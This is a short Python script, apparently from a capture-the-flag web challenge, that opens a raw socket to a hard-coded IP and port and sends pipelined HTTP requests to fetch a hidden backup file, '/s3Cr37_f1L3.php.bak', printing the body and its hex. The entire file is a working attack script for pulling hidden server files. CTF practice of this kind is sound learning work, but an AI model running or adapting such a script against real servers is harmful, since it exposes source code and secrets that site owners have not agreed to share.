import socket

host = '61.147.171.105'
port = 58039

# 目标文件更改为注释中发现的文件
target_file = '/s3Cr37_f1L3.php.bak'

payload = (
    f'GET {target_file} HTTP/1.1\r\n'
    'Host: ' + host + '\r\n'
    '\r\n'
    'GET /xyz.xyz HTTP/1.1\r\n'
    '\r\n'
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((host, port))
sock.send(payload.encode())

response = b''
while True:
    try:
        chunk = sock.recv(8192)
        if not chunk:
            break
        response += chunk
    except socket.timeout:
        break
sock.close()

decoded = response.decode('utf-8', errors='replace')
print(f'--- Content of {target_file} ---')
print(decoded)
print('--- Hex content ---')
# Split header and body to see body clearly
parts = response.split(b'\r\n\r\n', 1)
if len(parts) > 1:
    print(parts[1].hex())
    print(f'Body length found: {len(parts[1])}')
else:
    print('No body found, full hex:')
    print(response.hex())
